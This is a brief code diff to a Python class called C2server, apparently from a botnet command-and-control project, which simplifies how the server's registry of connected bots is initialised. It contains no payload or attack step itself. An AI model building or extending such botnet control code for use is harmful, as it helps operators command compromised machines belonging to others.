@@ -8,9 +8,9 @@ from botnet_exceptions import *
 
 class C2server():
 
-    def __init__(self, user_id, bot=None):
+    def __init__(self, user_id):
         self.user_id = user_id
-        self.bots = {bot.address[0]: bot} if bot else {}
+        self.bots = {}
 
     def add_bot(self, bot):
         self.bots[bot.address[0]] = bot
